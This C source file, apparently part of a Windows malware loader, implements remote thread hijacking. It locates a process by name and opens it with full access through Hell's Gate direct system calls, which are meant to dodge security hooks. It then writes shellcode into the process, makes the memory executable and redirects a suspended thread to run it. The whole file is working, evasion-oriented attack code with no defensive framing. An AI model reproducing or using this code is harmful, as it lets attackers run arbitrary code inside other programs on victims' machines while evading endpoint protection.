/*
    Hijacking.c - Thread hijacking and shellcode injection
    -----------------------------------------------------
    Purpose:
        - Handles the process of hijacking threads and injecting shellcode into remote processes.
    Main Functions:
        - Suspends, modifies, and resumes threads in the target process.
        - Allocates memory and writes shellcode to remote processes.
        - Finds and opens remote threads for hijacking.
    Role in Project:
        - Provides the mechanisms for executing arbitrary code in the context of another process, supporting advanced injection techniques.
*/
#include <Windows.h>


#include "Structs.h"
#include "Common.h"
#include "Debug.h"

BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {
    CONTEXT   ThreadCtx = { 0 };
    ULONG     previousCount;
    NTSTATUS  status;

    // 1) Prepare to suspend
    ThreadCtx.ContextFlags = CONTEXT_ALL;
    HellsGate(g_Sys.NtSuspendThread.wSystemCall);
    status = HellsGate(hThread, &previousCount);
    if (!NT_SUCCESS(status)) {
#ifdef DEBUG
        PRINTA("[!] NtSuspendThread failed: 0x%0.8X\n", status);
#endif // DEBUG
        return FALSE;
    }

    // 2) Grab the thread context
    HellsGate(g_Sys.NtGetContextThread.wSystemCall);
    status = HellsGate(hThread, &ThreadCtx);
    if (!NT_SUCCESS(status)) {
#ifdef DEBUG
        PRINTA("[!] NtGetContextThread failed: 0x%0.8X\n", status);
#endif // DEBUG
        // restore state before returning
        HellsGate(g_Sys.NtResumeThread.wSystemCall);
        HellsGate(hThread, &previousCount);
        return FALSE;
    }

    // 3) Overwrite RIP/EIP
#ifdef _M_X64
    ThreadCtx.Rip = (DWORD64)pAddress;
#else
    ThreadCtx.Eip = (DWORD)pAddress;
#endif

    // 4) Write the modified context back
    HellsGate(g_Sys.NtSetContextThread.wSystemCall);
    status = HellsGate(hThread, &ThreadCtx);
    if (!NT_SUCCESS(status)) {
#ifdef DEBUG
        PRINTA("[!] NtSetContextThread failed: 0x%0.8X\n", status);
#endif // DEBUG
        // restore state before returning
        HellsGate(g_Sys.NtResumeThread.wSystemCall);
        HellsGate(hThread, &previousCount);
        return FALSE;
    }

    // 5) Pause for operator
#ifdef DEBUG
    PRINTA("\t[#] Press <Enter> To Run ... ");
#endif // DEBUG

    // 6) Resume the thread
    HellsGate(g_Sys.NtResumeThread.wSystemCall);
    status = HellsGate(hThread, &previousCount);
    if (!NT_SUCCESS(status)) {
#ifdef DEBUG
        PRINTA("[!] NtResumeThread failed: 0x%0.8X\n", status);
#endif // DEBUG
        return FALSE;
    }

    // 7) Wait indefinitely for the thread to exit
    HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
    status = HellsGate(hThread, FALSE, NULL);
    if (!NT_SUCCESS(status)) {
#ifdef DEBUG
        PRINTA("[!] NtWaitForSingleObject failed: 0x%0.8X\n", status);
#endif // DEBUG
        return FALSE;
    }

    return TRUE;
}


BOOL InjectShellcodeToRemoteProcess(
    IN  HANDLE  hProcess,
    IN  PBYTE   pShellcode,
    IN  SIZE_T  sSizeOfShellcode,
    OUT PVOID* ppAddress
) {
    NTSTATUS status;
    PVOID    baseAddress = NULL;
    SIZE_T   regionSize = sSizeOfShellcode;
    SIZE_T   bytesWritten;
    ULONG    oldProtect;

    // 1) Allocate RW memory in remote process
    HellsGate(g_Sys.NtAllocateVirtualMemoryEx.wSystemCall);
    status = HellsGate(
        hProcess,                   // ProcessHandle
        &baseAddress,               // BaseAddress*
        0,                          // ZeroBits
        &regionSize,                // RegionSize*
        MEM_COMMIT | MEM_RESERVE,   // AllocationType
        PAGE_READWRITE              // Protect
    );
    if (!NT_SUCCESS(status)) {
#ifdef DEBUG
        PRINTA("[!] NtAllocateVirtualMemoryEx failed: 0x%0.8X\n", status);
#endif // DEBUG
        return FALSE;
    }
    *ppAddress = baseAddress;
#ifdef DEBUG
    PRINTA("[i] Allocated RW memory at 0x%p (size = %zu bytes)\n",
        baseAddress, regionSize);
#endif // DEBUG

    // 2) Pause before writing
#ifdef DEBUG
    PRINTA("[#] Press <Enter> to write payload");
#endif // DEBUG

    // 3) Write shellcode
    HellsGate(g_Sys.NtWriteVirtualMemory.wSystemCall);
    status = HellsGate(
        hProcess,             // ProcessHandle
        baseAddress,          // BaseAddress
        pShellcode,           // Buffer
        regionSize,           // NumberOfBytesToWrite
        &bytesWritten         // NumberOfBytesWritten*
    );
    if (!NT_SUCCESS(status) || bytesWritten != regionSize) {
#ifdef DEBUG
        PRINTA("[!] NtWriteVirtualMemory failed: 0x%0.8X (wrote %llu bytes)\n",
            status, (unsigned long long)bytesWritten);
#endif // DEBUG
        return FALSE;
    }
#ifdef DEBUG
    PRINTA("[i] Wrote %zu bytes of shellcode\n", bytesWritten);
#endif // DEBUG

    // 4) Change protection to RX
    HellsGate(g_Sys.NtProtectVirtualMemory.wSystemCall);
    status = HellsGate(
        hProcess,             // ProcessHandle
        &baseAddress,         // BaseAddress*
        &regionSize,          // RegionSize*
        PAGE_EXECUTE_READ,    // NewProtect
        &oldProtect           // OldProtect*
    );
    if (!NT_SUCCESS(status)) {
#ifdef DEBUG
        PRINTA("[!] NtProtectVirtualMemory failed: 0x%0.8X\n", status);
#endif // DEBUG
        return FALSE;
    }
#ifdef DEBUG
    PRINTA("[i] Changed memory to PAGE_EXECUTE_READ (old = 0x%X)\n", oldProtect);
#endif // DEBUG

    return TRUE;
}


BOOL GetRemoteThreadHandle(
    IN  DWORD   dwProcessId,
    OUT PDWORD  dwThreadId,
    OUT PHANDLE hThread
) {
    HANDLE        hSnapshot = NULL;
    THREADENTRY32 teEntry = { 0 };
    NTSTATUS      status;
    CLIENT_ID     cid;

    teEntry.dwSize = sizeof(THREADENTRY32);

    // 1) Take a snapshot of all threads in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
        PRINTA("\t[!] CreateToolhelp32Snapshot failed: %u\n", GetLastError());
#endif // DEBUG
        return FALSE;
    }

    // 2) Iterate until we find a thread in our target process
    if (!Thread32First(hSnapshot, &teEntry)) {
#ifdef DEBUG
        PRINTA("\n\t[!] Thread32First failed: %u\n", GetLastError());
#endif // DEBUG
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        if (teEntry.th32OwnerProcessID == dwProcessId) {
            *dwThreadId = teEntry.th32ThreadID;

            // Prepare CLIENT_ID for NtOpenThread
            cid.UniqueProcess = (HANDLE)(ULONG_PTR)dwProcessId;
            cid.UniqueThread = (HANDLE)(ULONG_PTR)teEntry.th32ThreadID;

            // 3) Open the thread via syscall
            HellsGate(g_Sys.NtOpenThread.wSystemCall);
            status = HellsGate(
                hThread,                // PHANDLE ThreadHandle
                THREAD_ALL_ACCESS,      // ACCESS_MASK DesiredAccess
                NULL,                   // POBJECT_ATTRIBUTES ObjectAttributes
                &cid                    // PCLIENT_ID ClientId
            );

            if (!NT_SUCCESS(status) || *hThread == NULL) {
#ifdef DEBUG
                PRINTA("\n\t[!] NtOpenThread failed: 0x%0.8X\n", status);
#endif // DEBUG
                // keep searching in case another thread works
                continue;
            }
            break;
        }
    } while (Thread32Next(hSnapshot, &teEntry));

    // 4) Clean up the snapshot handle via syscall
    HellsGate(g_Sys.NtClose.wSystemCall);
    HellsGate(hSnapshot);

    // 5) Verify we found and opened a thread
    if (*dwThreadId == 0 || *hThread == NULL) {
        return FALSE;
    }

    return TRUE;
}


BOOL GetRemoteProcessHandle(
    IN  LPWSTR  szProcessName,
    OUT PDWORD  dwProcessId,
    OUT PHANDLE hProcess
) {
    HANDLE          hSnapshot = NULL;
    PROCESSENTRY32  peEntry = { 0 };
    NTSTATUS        status;
    CLIENT_ID       cid;
    WCHAR           LowerName[MAX_PATH];

    peEntry.dwSize = sizeof(PROCESSENTRY32);

    // 1) Snapshot all processes
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
        PRINTA("[!] CreateToolhelp32Snapshot failed: 0x%0.8X\n", GetLastError());
#endif // DEBUG
        return FALSE;
    }

    // 2) Iterate through processes
    if (!Process32First(hSnapshot, &peEntry)) {
#ifdef DEBUG
        PRINTA("[!] Process32First failed: 0x%0.8X\n", GetLastError());
#endif // DEBUG
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        // Lowercase the exe name for comparison
        RtlSecureZeroMemory(LowerName, sizeof(LowerName));
        for (DWORD i = 0; peEntry.szExeFile[i] && i < MAX_PATH - 1; i++) {
            LowerName[i] = towlower(peEntry.szExeFile[i]);
        }

        if (wcscmp(LowerName, szProcessName) == 0) {
            *dwProcessId = peEntry.th32ProcessID;

            // Prepare CLIENT_ID for NtOpenProcess
            cid.UniqueProcess = (HANDLE)(ULONG_PTR)*dwProcessId;
            cid.UniqueThread = NULL;

            // 3) Open the process via syscall
            HellsGate(g_Sys.NtOpenProcess.wSystemCall);
            status = HellsGate(
                hProcess,                // PHANDLE ProcessHandle
                PROCESS_ALL_ACCESS,      // ACCESS_MASK DesiredAccess
                NULL,                    // POBJECT_ATTRIBUTES ObjectAttributes
                &cid                     // PCLIENT_ID ClientId
            );
            if (!NT_SUCCESS(status) || *hProcess == NULL) {
#ifdef DEBUG
                PRINTA("[!] NtOpenProcess failed: 0x%0.8X\n", status);
#endif // DEBUG
            }
            break;
        }
    } while (Process32Next(hSnapshot, &peEntry));

    // 4) Close the snapshot handle via syscall
    HellsGate(g_Sys.NtClose.wSystemCall);
    HellsGate(hSnapshot);

    // 5) Validate results
    if (*dwProcessId == 0 || *hProcess == NULL) {
        return FALSE;
    }

    return TRUE;
}


BOOL RemoteInjectAndHijack(
    IN  LPWSTR  szProcessName,
    IN  PBYTE   pShellcode,
    IN  SIZE_T  sShellcodeSize
) {
    DWORD   dwProcessId = 0;
    HANDLE  hProcess = NULL;
    PVOID   pRemoteAddr = NULL;
    DWORD   dwThreadId = 0;
    HANDLE  hThread = NULL;
    BOOL    ok = FALSE;

    // 1) Find & open the target process
    if (!GetRemoteProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
#ifdef DEBUG
        PRINTA("[!] Unable to open process \"%ws\"\n", szProcessName);
#endif // DEBUG
        goto cleanup;
    }

    // 2) Allocate & write our shellcode into it
    if (!InjectShellcodeToRemoteProcess(hProcess, pShellcode, sShellcodeSize, &pRemoteAddr)) {
#ifdef DEBUG
        PRINTA("[!] Shellcode injection failed\n");
#endif // DEBUG
        goto cleanup;
    }

    // 3) Find & open one of its threads
    if (!GetRemoteThreadHandle(dwProcessId, &dwThreadId, &hThread)) {
#ifdef DEBUG
        PRINTA("[!] Unable to get a remote thread handle (PID=%u)\n", dwProcessId);
#endif // DEBUG
        goto cleanup;
    }

    // 4) Hijack that threads context to point at our shellcode
    if (!HijackThread(hThread, pRemoteAddr)) {
#ifdef DEBUG
        PRINTA("[!] Thread hijack failed (TID=%u)\n", dwThreadId);
#endif // DEBUG
        goto cleanup;
    }

    ok = TRUE;

cleanup:
    if (hThread)  HellsGate(g_Sys.NtClose.wSystemCall), HellsGate(hThread);
    if (hProcess) HellsGate(g_Sys.NtClose.wSystemCall), HellsGate(hProcess);
    return ok;
}
